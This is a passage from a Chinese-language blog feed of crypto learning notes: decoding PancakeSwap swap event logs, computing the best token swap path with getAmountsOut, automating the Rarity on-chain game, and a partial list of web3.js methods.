<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">(uint112 _reserve0, uint112 _reserve1,) = <span class="title function_">getReserves</span>(); <span class="comment">// gas savings</span></span><br><span class="line"><span class="comment">// 返回用于交易定价和分配流动性的token0和token1储备</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// force reserves to match balances</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">sync</span>(<span class="params"></span>) external lock &#123;</span><br><span class="line">	<span class="title function_">_update</span>(<span class="title class_">IERC20</span>(token0).<span class="title function_">balanceOf</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>)), <span class="title class_">IERC20</span>(token1).<span class="title function_">balanceOf</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>)), reserve0, reserve1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>看了下solidity源码，这步应该是用于同步 交易定价和分配流动性的token0和token1储备</p>
<ol start="5">
<li class="lvl-3">
<p>PancakeSwap V2: VRT 5——Swap()</p>
</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">AttributeDict(&#123;</span><br><span class="line">	<span class="string">&#x27;args&#x27;</span>: AttributeDict(&#123;</span><br><span class="line">		<span class="string">&#x27;sender&#x27;</span>: <span class="string">&#x27;0x10ED43C718714eb63d5aA57B78B54704E256024E&#x27;</span>, <span class="comment"># router_v2</span></span><br><span class="line">		<span class="string">&#x27;to&#x27;</span>: <span class="string">&#x27;0x302c98e6d6A65Bf15255b81972f9EaA1F45438C8&#x27;</span>, <span class="comment"># My Address</span></span><br><span class="line">		<span class="string">&#x27;amount0In&#x27;</span>: <span class="number">0</span>,</span><br><span class="line">		<span class="string">&#x27;amount1In&#x27;</span>: <span class="number">1000000000000000</span>, <span class="comment"># 0.001BNB</span></span><br><span class="line">		<span class="string">&#x27;amount0Out&#x27;</span>: <span class="number">404088513609832092320</span>, <span class="comment"># 404.08851360983209232 vrt</span></span><br><span class="line">		<span class="string">&#x27;amount1Out&#x27;</span>: <span class="number">0</span></span><br><span class="line">	&#125;),</span><br><span class="line">	<span class="string">&#x27;event&#x27;</span>: <span class="string">&#x27;Swap&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;logIndex&#x27;</span>: <span class="number">756</span>,</span><br><span class="line">	<span class="string">&#x27;transactionIndex&#x27;</span>: <span class="number">215</span>,</span><br><span class="line">	<span class="string">&#x27;transactionHash&#x27;</span>: HexBytes(<span class="string">&#x27;0xa1215da3b2f9fba0dc4ce90318fd42e947d596e91c6582d8b450612f6a472abf&#x27;</span>),</span><br><span class="line">	<span class="string">&#x27;address&#x27;</span>: <span class="string">&#x27;0xEf5212aDa83EC2cc105C409DF10b8806D20E3b35&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;blockHash&#x27;</span>: HexBytes(<span class="string">&#x27;0x9ba33f85ec6edccfee637ae9a3eb8303df74aeb81cbc106676c1af44f7291cb3&#x27;</span>),</span><br><span class="line">	<span class="string">&#x27;blockNumber&#x27;</span>: <span class="number">11864838</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<blockquote>
<p>这步和第3步有什么区别?</p>
</blockquote>
<hr />
<h1>Question:</h1>
<h2 id="swap比转账要消耗更多的gas">swap比转账要消耗更多的gas?</h2>
<p>我觉得是，测试过程中，swap的话消耗 <code>0.000652585 BNB</code>，转账的话消耗 <code>0.0001071 BNB</code></p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20211018163457.png" alt="20211018163457" /></p>
<p>swap要比转账需要更多的执行步骤, 所以需要消耗更多的gas</p>
<h1>Summary:</h1>
<p>交易收据里log列表里有事件event<br />
event里的内容，用对应合约去解析一下，就可以看到记录里调用哪个合约的哪个函数以及哪些入参</p>
<p>感觉可以写个简单页面玩玩，类似debank里的交易历史<br />
<img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/1A6352FF-E581-4644-88F2-A7994A20AD46.png" alt="1A6352FF-E581-4644-88F2-A7994A20AD46" /></p>
<p>后面还要看看<code>预言机</code>的相关内容</p>
<h1>Refs:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://docs.uniswap.org/protocol/V2/reference/smart-contracts/pair">uniswap pair doc</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>Crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>Crypto-pancakeswap_最佳交易对路径</title>
    <url>/2021/49032.html</url>
    <content><![CDATA[<h1>Pre:</h1>
<p>当你在pancakeswap上交易时，它会帮你找到最佳的交易对路径，中间交易代币可能是一个或多个。那它这个最佳交易对路径是如何计算出来的呢?</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20211020104114.png" alt="20211020104114" /></p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20211020104124.png" alt="20211020104124" /></p>
<h1>如何查找最佳交易对路径:</h1>
<p><a href="https://docs.uniswap.org/sdk/2.0.0/reference/trade#besttradeexactin">uniswap sdk</a></p>
<p>从sdk中可以看到有<code>bestTradeExactIn</code>方法:</p>
<blockquote>
<p>给定一组对、固定数量的输入和输出的代币数量，此方法返回将maxNumResults输入代币数量交换为输出代币的最佳交易，最多maxHops跳数。返回的交易按输出金额降序排列，并且都共享给定的输入金额。</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Trade.bestTradeExactIn(</span><br><span class="line">    pairs: Pair[],</span><br><span class="line">    amountIn: TokenAmount,</span><br><span class="line">    tokenOut: Token,</span><br><span class="line">    &#123; maxNumResults = 3, maxHops = 3 &#125;: BestTradeOptions = &#123;&#125;): Trade[]</span><br></pre></td></tr></table></figure>
<p>意思就是哪个交易对路径最后返回的币最多，哪个就是最佳路径。如果要自己简单的实现的话,可以找到对应链的主流币种，例如<code>USDT</code>,<code>BNB</code>,<code>BUSD</code>等。<br />
<strong>所有代币都是与这些代币中的一种或多种配对组成流动性池子的</strong>。因此，只要用这些代币作为路径组合的中间币种即可，而无需考虑全部代币。</p>
<p>tokenA 兑换 tokenB 可遍历的路径包括：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>tokenA &gt; tokenB：只有两个代币存在直接配对的流动性池子时，该路径才有效</p>
</li>
<li class="lvl-2">
<p>tokenA &gt; tokenC &gt; tokenB：tokenC 就是常用代币中的一种，要求 tokenA-tokenC 和 tokenC-tokenB 分别都存在流动性池子</p>
</li>
<li class="lvl-2">
<p>tokenA &gt; tokenC &gt; tokenD &gt; tokenB：tokenC 和 tokenD 是常用代币列表中的两种代币，要求 tokenA-tokenC、tokenC-tokenD、tokenD-tokenB 这三个配对的流动性池子是有效的</p>
</li>
</ul>
<p>然后自己去简单遍历构造交易对路径。调用<code>pancakeswap router</code>的<code>getAmountsOut</code>方法</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20211105165458.png" alt="20211105165458" /></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># python web3部分代码</span></span><br><span class="line">predicted_out = router_contract.functions.getAmountsOut(amount_bnb, [from_token_address, contract_addr,</span><br><span class="line">                                                                                 token_address]).call()[-<span class="number">1</span>]</span><br></pre></td></tr></table></figure>
<p>最终哪个交易路径最后返回的币最多，哪个就是最佳路径。</p>
<h1>简单试验:</h1>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20211105165844.png" alt="20211105165844" /></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ADA-BUSD-BUNNY--32.601445898030065398</span><br><span class="line">ADA-WBNB-BUNNY--57.411093623881308004</span><br><span class="line">ADA-USDT-BUNNY--13.477518281960642732</span><br><span class="line">ADA-USDC-BUNNY--0.000005664178344977</span><br><span class="line">ADA-CAKE-BUNNY--48.583485276034042082</span><br></pre></td></tr></table></figure>
<p>查询出来是含bnb的交易路径是最佳的，和前端页面显示的也对得上。</p>
<p>至于为什么不同的交易路径会有不同的返回，暂时猜测和池子的深度有关。后续还有看看<code>uniswap</code>的源码后，才能更加深入的理解</p>
<h1>Refs:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://learnblockchain.cn/question/2093">uniswap 前端是怎么计算得出一个交易对的path(route)的？</a></p>
</li>
<li class="lvl-2">
<p><a href="https://learnblockchain.cn/question/2453">uniswap sdk 怎么获取全部交易对去筛选路径呢</a></p>
</li>
<li class="lvl-2">
<p><a href="https://ethereum.stackexchange.com/questions/102875/uniswap-sdk-how-do-i-figure-out-the-best-route-for-a-swap-how-do-do-multiho">@uniswap SDK – how do I figure out the best route for a SWAP? How do do multihop with SDK?</a></p>
</li>
<li class="lvl-2">
<p><a href="https://cloud.tencent.com/developer/article/1851807">这几天我写了一个DEX交易聚合器</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>Crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>Crypto-rarity自动冒险升级脚本</title>
    <url>/2021/3287.html</url>
    <content><![CDATA[<h1>Pre:</h1>
<p>rarity有一些web界面，可供玩家去冒险、升级。但是为了方便，能够自动去冒险、升级，还是自己简单写个脚本try一下。</p>
<p>顺便熟悉一下<code>solidty</code>和<code>web3js</code></p>
<hr />
<h1>Rarity:</h1>
<h2 id="简介-2">简介:</h2>
<p>Yearn Finance 创始人 Andre Cronje 发文称受到 Loot 启发推出游戏 Rarity，在该游戏中玩家可创建召唤师，Rarity 总量没有限制，除 Gas 外无需其他费用，召唤师每天可以通过冒险赚取 xp 经验值，一旦获得了一定量的 xp 就可以升级，获得特技和法术。</p>
<p>游戏共有 11 个角色，分别是野人、吟游诗人、牧师、德鲁伊、斗士、僧侣、圣骑士、游侠、巡逻兵、巫师、法师。</p>
<hr />
<h2 id="合约源码">合约源码:</h2>
<p><a href="https://github.com/andrecronje/rarity/blob/main/core/rarity.sol">rarity solidity源码</a></p>
<p>简单通读一下源码,发现solidity写的代码还是挺简单的，并没想象中的难，可能跟没有那么多操作要放在链上有关。</p>
<h2 id="readContract">readContract:</h2>
<p><a href="https://ftmscan.com/address/0xce761d788df608bd21bdd59d6f4b54b2e27f25bb#readContract">https://ftmscan.com/address/0xce761d788df608bd21bdd59d6f4b54b2e27f25bb#readContract</a></p>
<p>挑几个比较重要的函数说明下</p>
<blockquote>
<p>adventures_log</p>
</blockquote>
<ul class="lvl-0">
<li class="lvl-2">
<p>查询下一次冒险的时间</p>
</li>
<li class="lvl-2">
<p>input:角色id</p>
</li>
<li class="lvl-2">
<p>output:下一次冒险的时间戳</p>
</li>
</ul>
<blockquote>
<p>summoner</p>
</blockquote>
<ul class="lvl-0">
<li class="lvl-2">
<p>查询角色信息</p>
</li>
<li class="lvl-2">
<p>input:角色id</p>
</li>
<li class="lvl-2">
<p>output:角色的经验、下一次冒险的时间戳、职业类别、等级</p>
</li>
</ul>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/25641732-8ED4-4D10-81F4-B5E90094D83D.png" alt="25641732-8ED4-4D10-81F4-B5E90094D83D" /></p>
<blockquote>
<p>xp_required</p>
</blockquote>
<ul class="lvl-0">
<li class="lvl-2">
<p>查询下一级所需经验</p>
</li>
<li class="lvl-2">
<p>input:等级</p>
</li>
<li class="lvl-2">
<p>output:下一级所需经验</p>
</li>
</ul>
<h2 id="writeContract">writeContract:</h2>
<p><a href="https://ftmscan.com/address/0xce761d788df608bd21bdd59d6f4b54b2e27f25bb#writeContract">https://ftmscan.com/address/0xce761d788df608bd21bdd59d6f4b54b2e27f25bb#writeContract</a></p>
<blockquote>
<p>adventure</p>
</blockquote>
<ul class="lvl-0">
<li class="lvl-2">
<p>让角色去冒险,每天只能冒险一次，每次获得250xp</p>
</li>
<li class="lvl-2">
<p>input:角色id</p>
</li>
</ul>
<blockquote>
<p>level_up</p>
</blockquote>
<ul class="lvl-0">
<li class="lvl-2">
<p>角色升级</p>
</li>
<li class="lvl-2">
<p>input:角色id</p>
</li>
</ul>
<hr />
<h1>脚本:</h1>
<h2 id="流程图-2">流程图:</h2>
<p>自动冒险:</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/DF22C901-3AC7-48EE-8D73-592181380B59.png" alt="DF22C901-3AC7-48EE-8D73-592181380B59" /></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>查出自己地址有哪些角色id</p>
</li>
<li class="lvl-2">
<p>调用合约的查询函数<code>summoner</code>，知道下一次冒险时间</p>
</li>
<li class="lvl-2">
<p>判断一下有没到冒险时间</p>
</li>
<li class="lvl-2">
<p>满足条件的话，调用合约的<code>adventure</code>，让角色去冒险</p>
</li>
</ul>
<p>自动升级:</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/84454A4B-F8F1-444D-AB4A-79B47F941381.png" alt="84454A4B-F8F1-444D-AB4A-79B47F941381" /></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>调用合约函数<code>summoner</code>，知道当前经验值</p>
</li>
<li class="lvl-2">
<p>调用合约函数<code>xp_required</code>,知道下次升级所需经验</p>
</li>
<li class="lvl-2">
<p>满足条件的话，调用合约的<code>level_up</code>，让角色去升级</p>
</li>
</ul>
<hr />
<h1>一些问题:</h1>
<h1>gas：</h1>
<p>自己的脚本和<code>https://rarityextended.com/</code>执行的gas费有些差异,后续有空要看一下怎么样省一下gas fee，虽然也很少钱。</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/2749692E-F7D8-49E0-A22D-BD8AE0CC1040.png" alt="2749692E-F7D8-49E0-A22D-BD8AE0CC1040" /></p>
<h1>交易失败:</h1>
<p>脚本定时跑起来后，常有几笔失败的交易，可能跟nonce设置有关系。</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20210927120445.png" alt="20210927120445" /></p>
<hr />
<h1>总结:</h1>
<p>脚本定时跑起来后，就不用去web页面上一个个点去冒险和升级，方便了不少，写之前觉得挺麻烦的，有点无从下手，写完才发现很简单。hhh</p>
<p>后续加点、玩副本这些，有空再研究补充下吧~</p>
<hr />
<h1>Refs:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://www.chainnews.com/news/322609390326.htm">Yearn Finance 创始人受 Loot 启发推出冒险游戏 Rarity</a></p>
</li>
<li class="lvl-2">
<p><a href="https://bihu.com/article/1182970312">全网最详细——AC游戏“Rarity”人物简介和加点攻略</a></p>
</li>
<li class="lvl-2">
<p><a href="https://bihu.com/article/1438014279">【百大链游】FTM上的大冒险Rarity</a></p>
</li>
<li class="lvl-2">
<p><a href="https://mp.weixin.qq.com/s/NwlpshhnEXgcqwqFF5JGbw">【DFarm】Rarity游戏基础规则超详细剖析</a></p>
</li>
<li class="lvl-2">
<p><a href="https://rarityextended.com/">rarity Web1</a></p>
</li>
<li class="lvl-2">
<p><a href="https://raritymmo.com/">rarity Web2</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>Crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>Crypto-web3js文档方法列表</title>
    <url>/2021/65046.html</url>
    <content><![CDATA[<h1>web3.js 1.0中文手册</h1>
<h1>web3</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p>web3.version - 版本信息</p>
</li>
<li class="lvl-2">
<p>web3.modules - 子模块集合对象</p>
</li>
<li class="lvl-2">
<p>web3.setProvider - 设置服务提供器</p>
</li>
<li class="lvl-2">
<p>web3.providers - 服务提供器集合对象</p>
</li>
<li class="lvl-2">
<p>web3.givenProvider - 原生服务提供器</p>
</li>
<li class="lvl-2">
<p>web3.currentProvider - 当前服务提供器</p>
</li>
<li class="lvl-2">
<p>web3.BatchRequest - 批量请求</p>
</li>
<li class="lvl-2">
<p>web3.extend - 模块继承</p>
</li>
</ul>
<h1>web3.eth</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p>web3.eth.defaultAccount - 默认账户</p>
</li>
<li class="lvl-2">
<p>web3.eth.defaultBlock - 默认块</p>
</li>
<li class="lvl-2">
<p>web3.eth.getProtocolVersion - 返回协议版本信息</p>
</li>
<li class="lvl-2">
<p>web3.eth.isSyncing - 检查节点是否同步</p>
</li>
<li class="lvl-2">
<p>web3.eth.getCoinbase - 返回挖矿收益账户</p>
</li>
<li class="lvl-2">
<p>web3.eth.isMining - 检查节点是否在挖矿</p>
</li>
<li class="lvl-2">
<p>web3.eth.getHashrate - 返回节点旳哈希计算速度</p>
</li>
<li class="lvl-2">
<p>web3.eth.getGasPrice - 返回当前gas价格</p>
</li>
<li class="lvl-2">
<p>web3.eth.getAccounts - 返回账户列表</p>
</li>
<li class="lvl-2">
<p>web3.eth.getBlockNumber - 返回当前块编号</p>
</li>
<li class="lvl-2">
<p>web3.eth.getBalance - 返回指定账户余额</p>
</li>
<li class="lvl-2">
<p>web3.eth.getStorageAt - 返回指定地址存储内容</p>
</li>
<li class="lvl-2">
<p>web3.eth.getCode - 返回指定地址的代码</p>
</li>
<li class="lvl-2">
<p>web3.eth.getBlock - 返回指定块</p>
</li>
<li class="lvl-2">
<p>web3.eth.getBlockTransactionCount - 返回指定块中的交易数量</p>
</li>
<li class="lvl-2">
<p>web3.eth.getUncle - 返回指定叔伯块</p>
</li>
<li class="lvl-2">
<p>web3.eth.getTransaction - 返回指定交易对象</p>
</li>
<li class="lvl-2">
<p>web3.eth.getTransactionFromBlock - 返回块中指定交易对象</p>
</li>
<li class="lvl-2">
<p>web3.eth.getTransactionReceipt - 返回指定交易的收据</p>
</li>
<li class="lvl-2">
<p>web3.eth.getTransactionCount - 返回指定地址发生的交易数量</p>
</li>
<li class="lvl-2">
<p>web3.eth.sendTransaction - 发送交易</p>
</li>
<li class="lvl-2">
<p>web3.eth.sendSignedTransaction - 发送已签名交易</p>
</li>
<li class="lvl-2">
<p>web3.eth.sign - 为数据生成签名</p>
</li>
<li class="lvl-2">
<p>web3.eth.signTransaction - 为交易生成签名</p>
</li>
<li class="lvl-2">
<p>web3.eth.call - 执行消息调用</p>
</li>
<li class="lvl-2">
<p>web3.eth.estimateGas - 估算gas用量</p>
</li>
<li class="lvl-2">
<p>web3.eth.getPastLogs - 返回历史日志</p>
</li>
<li class="lvl-2">
<p>web3.eth.getCompilers - 返回可用编译器清单</p>
</li>
<li class="lvl-2">
<p>web3.eth.compile.solidity - 编译solidity代码</p>
</li>
<li class="lvl-2">
<p>web3.eth.compile.lll - 编译lll代码</p>
</li>
<li class="lvl-2">
<p>web3.eth.compile.serpent - 编译serpent代码</p>
</li>
<li class="lvl-2">
<p>web3.eth.getWork - 返回当前挖矿工作情况</p>
</li>
<li class="lvl-2">
<p>web3.eth.submitWork - 提交POW解决方案</p>
</li>
<li class="lvl-2">
<p>web3.eth.subscribe</p>
</li>
<li class="lvl-2">
<p>web3.eth.subscribe - 订阅链上事件</p>
</li>
<li class="lvl-2">
<p>web3.eth.clearSubscriptions - 复位订阅状态</p>
</li>
<li class="lvl-2">
<p>web3.eth.subscribe(‘pendingTransactions’) - 订阅挂起交易事件</p>
</li>
<li class="lvl-2">
<p>web3.eth.subscribe(‘newBlockHeaders’) - 订阅区块头生成事件</p>
</li>
<li class="lvl-2">
<p>web3.eth.subscribe(‘syncing’) - 订阅同步事件</p>
</li>
<li class="lvl-2">
<p>web3.eth.subscribe(‘logs’) - 订阅日志</p>
</li>
</ul>
<h1>智能合约</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p>web3.eth.Contract - 合约构造函数</p>
</li>
<li class="lvl-2">
<p>options - 合约配置对象</p>
</li>
<li class="lvl-2">
<p>options.address - 合约地址</p>
</li>
<li class="lvl-2">
<p>options.jsonInterface - 合约JSON接口</p>
</li>
<li class="lvl-2">
<p>clone - 克隆合约</p>
</li>
<li class="lvl-2">
<p>deploy - 部署合约</p>
</li>
<li class="lvl-2">
<p>methods - 为合约方法创建交易</p>
</li>
<li class="lvl-2">
<p>call - 调用合约方法</p>
</li>
<li class="lvl-2">
<p>send - 发送合约方法交易</p>
</li>
<li class="lvl-2">
<p>estimateGas - 估算合约方法gas用量</p>
</li>
<li class="lvl-2">
<p>encodeABI - ABI编码合约方法</p>
</li>
<li class="lvl-2">
<p>once - 单次订阅合约事件</p>
</li>
<li class="lvl-2">
<p>events - 订阅合约事件</p>
</li>
<li class="lvl-2">
<p>events.allEvents - 订阅全部事件</p>
</li>
<li class="lvl-2">
<p>getPastEvents - 读取历史事件</p>
</li>
</ul>
<h1>账户管理</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p>web3.eth.accounts - 账户管理与交易签名</p>
</li>
<li class="lvl-2">
<p>web3.eth.accounts.create - 创建账户</p>
</li>
<li class="lvl-2">
<p>web3.eth.accounts.privateKeyToAccount - 使用指定私钥创建账户</p>
</li>
<li class="lvl-2">
<p>web3.eth.accounts.recoverTransaction - 提取交易的签名账户</p>
</li>
<li class="lvl-2">
<p>web3.eth.accounts.hashMessage - 计算消息的哈希</p>
</li>
<li class="lvl-2">
<p>web3.eth.accounts.sign - 为数据生成签名</p>
</li>
<li class="lvl-2">
<p>web3.eth.accounts.recover - 提取数据的签名账户</p>
</li>
<li class="lvl-2">
<p>web3.eth.accounts.encrypt - 加密指定私钥</p>
</li>
<li class="lvl-2">
<p>web3.eth.accounts.decrypt - 解密keystore对象</p>
</li>
<li class="lvl-2">
<p>web3.eth.accounts.wallet - 钱包对象</p>
</li>
<li class="lvl-2">
<p>web3.eth.accounts.wallet.create - 在钱包中创建账户</p>
</li>
<li class="lvl-2">
<p>web3.eth.accounts.wallet.add - 向钱包添加已有账户</p>
</li>
<li class="lvl-2">
<p>web3.eth.accounts.wallet.remove - 从钱包中移除指定账户</p>
</li>
<li class="lvl-2">
<p>web3.eth.accounts.wallet.clear - 清空钱包</p>
</li>
<li class="lvl-2">
<p>web3.eth.accounts.wallet.encrypt - 加密钱包</p>
</li>
<li class="lvl-2">
<p>web3.eth.accounts.wallet.decrypt - 解密钱包</p>
</li>
<li class="lvl-2">
<p>web3.eth.accounts.wallet.save - 保存钱包</p>
</li>
<li class="lvl-2">
<p>web3.eth.accounts.wallet.load - 载入钱包</p>
</li>
</ul>
<h1>账户交互</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p>web3.eth.personal - 账户交互</p>
</li>
<li class="lvl-2">
<p>web3.eth.personal.newAccount - 创建新账户</p>
</li>
<li class="lvl-2">
<p>web3.eth.personal.sign - 为数据生成签名</p>
</li>
<li class="lvl-2">
<p>web3.eth.personal.ecRecover - 提取数据的签名账户</p>
</li>
<li class="lvl-2">
<p>web3.eth.personal.signTransaction - 为交易生成签名</p>
</li>
</ul>
<h1>应用二进制接口ABI</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p>web3.eth.abi - ABI管理</p>
</li>
<li class="lvl-2">
<p>web3.eth.abi.encodeFunctionSignature - 函数编码</p>
</li>
<li class="lvl-2">
<p>web3.eth.abi.encodeEventSignature - 事件编码</p>
</li>
<li class="lvl-2">
<p>web3.eth.abi.encodeParameter - 参数编码</p>
</li>
<li class="lvl-2">
<p>web3.eth.abi.encodeParameters - 参数组编码</p>
</li>
<li class="lvl-2">
<p>web3.eth.abi.encodeFunctionCall - 函数调用编码</p>
</li>
<li class="lvl-2">
<p>web3.eth.abi.decodeParameter - 参数解码</p>
</li>
<li class="lvl-2">
<p>web3.eth.abi.decodeParameters - 参数组解码</p>
</li>
<li class="lvl-2">
<p>web3.eth.abi.decodeLog - 日志解码</p>
</li>
</ul>
<h1>辅助工具</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p>web3.utils - 辅助工具函数集</p>
</li>
<li class="lvl-2">
<p>web3.utils.randomHex - 生成伪随机16进制字符串</p>
</li>
<li class="lvl-2">
<p>web3.utils._ - underscore接口</p>
</li>
<li class="lvl-2">
<p><a href="http://web3.utils.BN">web3.utils.BN</a> - BN.js接口</p>
</li>
<li class="lvl-2">
<p>web3.utils.isBN - 检查给定参数是否BN对象</p>
</li>
<li class="lvl-2">
<p>web3.utils.isBigNumber - 检查给定参数是否为BigNumber对象</p>
</li>
<li class="lvl-2">
<p>web3.utils.sha3 - 计算sha3哈希值</p>
</li>
<li class="lvl-2">
<p>web3.utils.soliditySha3 - solidity方式计算sha3哈希</p>
</li>
<li class="lvl-2">
<p>web3.utils.isHex - 检查给定参数是否为16进制</p>
</li>
<li class="lvl-2">
<p>web3.utils.isHexStrict - 严格模式16进制检查</p>
</li>
<li class="lvl-2">
<p>web3.utils.isAddress - 检查给定参数是否为有效地址</p>
</li>
<li class="lvl-2">
<p>web3.utils.toChecksumAddress - 转换为校验和地址</p>
</li>
<li class="lvl-2">
<p>web3.utils.checkAddressChecksum - 校验地址</p>
</li>
<li class="lvl-2">
<p>web3.utils.toHex - 转换为16进制字符串</p>
</li>
<li class="lvl-2">
<p>web3.utils.toBN - 转换为BN对象</p>
</li>
<li class="lvl-2">
<p>web3.utils.hexToNumberString - 转换为10进制数值字符串</p>
</li>
<li class="lvl-2">
<p>web3.utils.hexToNumber - 转换为数值</p>
</li>
<li class="lvl-2">
<p>web3.utils.numberToHex - 数值转换为16进制表示</p>
</li>
<li class="lvl-2">
<p>web3.utils.hexToUtf8 - 16进制字符串转换为utf-8</p>
</li>
<li class="lvl-2">
<p>web3.utils.hexToAscii - 16进制字符串转换为ascii</p>
</li>
<li class="lvl-2">
<p>web3.utils.utf8ToHex - utf-8字符串转换为16进制</p>
</li>
<li class="lvl-2">
<p>web3.utils.asciiToHex - ascii字符串转换为16进制</p>
</li>
<li class="lvl-2">
<p>web3.utils.hexToBytes - 16进制字符串转换为字节数组</p>
</li>
<li class="lvl-2">
<p>web3.utils.toWei - 转换到wei</p>
</li>
<li class="lvl-2">
<p>web3.utils.fromWei - 从wei转换到其他以太单位</p>
</li>
<li class="lvl-2">
<p>web3.utils.unitMap - 以太单位换算表</p>
</li>
<li class="lvl-2">
<p>web3.utils.padLeft - 左侧零补齐</p>
</li>
<li class="lvl-2">
<p>web3.utils.padRight - 右侧零补齐</p>
</li>
</ul>
<h1>网络交互</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p>web3.*.net - 网络交互</p>
</li>
<li class="lvl-2">
<p>web3.*.net.getId - 返回网络id</p>
</li>
<li class="lvl-2">
<p>web3.*.net.isListening - 检查节点监听状态</p>
</li>
<li class="lvl-2">
<p>web3.*.net.getPeerCount - 返回已连接对端节点数</p>
</li>
</ul>
<h2 id="地址转换">地址转换</h2>
<ul class="lvl-0">
<li class="lvl-2">
<p>web3.eth.Iban - 创建Iban对象</p>
</li>
<li class="lvl-2">
<p>web3.eth.Iban.toAddress - 将iban对象转换为以太坊地址</p>
</li>
<li class="lvl-2">
<p>web3.eth.Iban.toIban - 将以太坊地址转换为Iban对象</p>
</li>
<li class="lvl-2">
<p>web3.eth.Iban.toAddress - 将iban对象转换为以太坊地址</p>
</li>
<li class="lvl-2">
<p>web3.eth.Iban.fromEthereumAddress - 将以太坊地址转换为Iban对象</p>
</li>
<li class="lvl-2">
<p>web3.eth.Iban.fromBban - 使用Bban地址创建Iban对象</p>
</li>
<li class="lvl-2">
<p>web3.eth.Iban.createIndirect - 创建间接Iban对象</p>
</li>
<li class="lvl-2">
<p>web3.eth.Iban.isValid - 检查给定Iban地址是否有效</p>
</li>
<li class="lvl-2">
<p>web3.eth.Iban.isDirect - 检查是否采用直接编码方案</p>
</li>
<li class="lvl-2">
<p>web3.eth.Iban.isIndirect - 检查是否采用间接编码方案</p>
</li>
<li class="lvl-2">
<p>web3.eth.Iban.institution - 返回Iban的机构名称</p>
</li>
<li class="lvl-2">
<p>web3.eth.Iban.client - 返回Iban的客户账号</p>
</li>
<li class="lvl-2">
<p>web3.eth.Iban.toAddress - 实例方法</p>
</li>
<li class="lvl-2">
<p>web3.eth.Iban.toString - 返回Iban地址字符串</p>
</li>
</ul>
<h2 id="whisper协议交互">whisper协议交互</h2>
<ul class="lvl-0">
<li class="lvl-2">
<p>web3.shh - whisper协议交互</p>
</li>
<li class="lvl-2">
<p>web3.shh.getVersion - 返回whisper协议版本</p>
</li>
<li class="lvl-2">
<p>web3.shh.getInfo - 返回whisper节点信息</p>
</li>
<li class="lvl-2">
<p>web3.shh.setMaxMessageSize - 设置whisper消息大小上限</p>
</li>
<li class="lvl-2">
<p>web3.shh.setMinPoW - 设置节点最小PoW</p>
</li>
<li class="lvl-2">
<p>web3.shh.markTrustedPeer - 标记可信节点</p>
</li>
<li class="lvl-2">
<p>web3.shh.newKeyPair - 创建密钥对</p>
</li>
<li class="lvl-2">
<p>web3.shh.addPrivateKey - 使用私钥创建密钥对</p>
</li>
<li class="lvl-2">
<p>web3.shh.deleteKeyPair - 删除指定密钥对</p>
</li>
<li class="lvl-2">
<p>web3.shh.hasKeyPair - 检查节点是否有指定密钥对</p>
</li>
<li class="lvl-2">
<p>web3.shh.getPublicKey - 返回公钥</p>
</li>
<li class="lvl-2">
<p>web3.shh.getPrivateKey - 返回私钥</p>
</li>
<li class="lvl-2">
<p>web3.shh.newSymKey - 创建对称密钥</p>
</li>
<li class="lvl-2">
<p>web3.shh.addSymKey - 添加对称密钥</p>
</li>
<li class="lvl-2">
<p>web3.shh.generateSymKeyFromPassword - 使用指定密码生成对称密钥</p>
</li>
<li class="lvl-2">
<p>web3.shh.hasSymKey - 检查是否有指定对称密钥</p>
</li>
<li class="lvl-2">
<p>web3.shh.getSymKey - 返回对称密钥</p>
</li>
<li class="lvl-2">
<p>web3.shh.post - 发送whisper消息</p>
</li>
<li class="lvl-2">
<p>web3.shh.subscribe - 订阅whisper消息</p>
</li>
<li class="lvl-2">
<p>web3.shh.clearSubscriptions - 清理订阅</p>
</li>
<li class="lvl-2">
<p>web3.shh.newMessageFilter - 创建消息过滤器</p>
